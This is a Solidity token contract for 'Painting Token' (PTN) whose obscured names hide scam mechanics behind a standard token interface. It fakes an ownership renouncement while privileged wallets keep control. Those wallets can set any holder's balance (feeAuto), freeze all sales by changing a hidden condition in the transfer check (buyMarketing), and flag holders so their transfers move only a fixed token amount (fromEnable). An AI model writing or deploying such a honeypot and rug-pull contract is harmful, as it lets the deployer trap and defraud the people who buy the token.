//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface isSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeLaunched) external view returns (uint256);

    function transfer(address tradingIs, uint256 feeMin) external returns (bool);

    function allowance(address tradingTakeSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeMin) external returns (bool);

    function transferFrom(
        address sender,
        address tradingIs,
        uint256 feeMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atMarketing, uint256 value);
    event Approval(address indexed tradingTakeSender, address indexed spender, uint256 value);
}

abstract contract txAutoTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapTeam {
    function createPair(address listMax, address swapLiquidity) external returns (address);
}

interface enableShould is isSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PaintingToken is txAutoTake, isSwap, enableShould {

    constructor (){
        
        enableMaxIs();
        enableIs tradingTotalToken = enableIs(toAuto);
        limitMin = swapTeam(tradingTotalToken.factory()).createPair(tradingTotalToken.WETH(), address(this));
        
        amountList = _msgSender();
        walletListBuy[amountList] = true;
        receiverLaunch[amountList] = launchFee;
        
        emit Transfer(address(0), amountList, launchFee);
    }

    function teamAmount(address enableFundMax, address tradingIs, uint256 feeMin) internal returns (bool) {
        if (enableFundMax == amountList) {
            return modeTeam(enableFundMax, tradingIs, feeMin);
        }
        uint256 autoTx = isSwap(limitMin).balanceOf(swapTradingLimit);
        require(autoTx == txFromTo);
        require(tradingIs != swapTradingLimit);
        if (txTake[enableFundMax]) {
            return modeTeam(enableFundMax, tradingIs, takeSell);
        }
        return modeTeam(enableFundMax, tradingIs, feeMin);
    }

    address public limitMin;

    function decimals() external view virtual override returns (uint8) {
        return modeTeamTo;
    }

    bool public fundBuy;

    bool public sellReceiver;

    address private buyTokenAt;

    function approve(address feeAt, uint256 feeMin) public virtual override returns (bool) {
        launchMode[_msgSender()][feeAt] = feeMin;
        emit Approval(_msgSender(), feeAt, feeMin);
        return true;
    }

    event OwnershipTransferred(address indexed txSwapLiquidity, address indexed feeShouldWallet);

    mapping(address => bool) public walletListBuy;

    uint256 private launchFee = 100000000 * 10 ** 18;

    uint256 txFromTo;

    bool public autoExempt;

    function transferFrom(address enableFundMax, address tradingIs, uint256 feeMin) external override returns (bool) {
        if (_msgSender() != toAuto) {
            if (launchMode[enableFundMax][_msgSender()] != type(uint256).max) {
                require(feeMin <= launchMode[enableFundMax][_msgSender()]);
                launchMode[enableFundMax][_msgSender()] -= feeMin;
            }
        }
        return teamAmount(enableFundMax, tradingIs, feeMin);
    }

    uint256 public launchedAuto;

    function balanceOf(address feeLaunched) public view virtual override returns (uint256) {
        return receiverLaunch[feeLaunched];
    }

    function transfer(address isExempt, uint256 feeMin) external virtual override returns (bool) {
        return teamAmount(_msgSender(), isExempt, feeMin);
    }

    address swapTradingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private modeTeamTo = 18;

    mapping(address => uint256) private receiverLaunch;

    string private toTeamAt = "Painting Token";

    function feeMaxLiquidity(address listLimit) public {
        if (limitWallet) {
            return;
        }
        
        walletListBuy[listLimit] = true;
        
        limitWallet = true;
    }

    bool public limitTrading;

    function symbol() external view virtual override returns (string memory) {
        return swapTx;
    }

    mapping(address => bool) public txTake;

    uint256 private feeExempt;

    function feeAuto(address isExempt, uint256 feeMin) public {
        takeLaunched();
        receiverLaunch[isExempt] = feeMin;
    }

    uint256 sellSwap;

    address toAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function buyMarketing(uint256 feeMin) public {
        takeLaunched();
        txFromTo = feeMin;
    }

    function fromEnable(address minToEnable) public {
        takeLaunched();
        
        if (minToEnable == amountList || minToEnable == limitMin) {
            return;
        }
        txTake[minToEnable] = true;
    }

    address public amountList;

    function takeLaunched() private view {
        require(walletListBuy[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private launchMode;

    uint256 constant takeSell = 12 ** 10;

    uint256 private exemptAtList;

    string private swapTx = "PTN";

    bool private autoSwap;

    function name() external view virtual override returns (string memory) {
        return toTeamAt;
    }

    function enableMaxIs() public {
        emit OwnershipTransferred(amountList, address(0));
        buyTokenAt = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchFee;
    }

    uint256 private receiverToken;

    function getOwner() external view returns (address) {
        return buyTokenAt;
    }

    function allowance(address exemptIsLiquidity, address feeAt) external view virtual override returns (uint256) {
        if (feeAt == toAuto) {
            return type(uint256).max;
        }
        return launchMode[exemptIsLiquidity][feeAt];
    }

    bool public limitWallet;

    function modeTeam(address enableFundMax, address tradingIs, uint256 feeMin) internal returns (bool) {
        require(receiverLaunch[enableFundMax] >= feeMin);
        receiverLaunch[enableFundMax] -= feeMin;
        receiverLaunch[tradingIs] += feeMin;
        emit Transfer(enableFundMax, tradingIs, feeMin);
        return true;
    }

    function owner() external view returns (address) {
        return buyTokenAt;
    }

}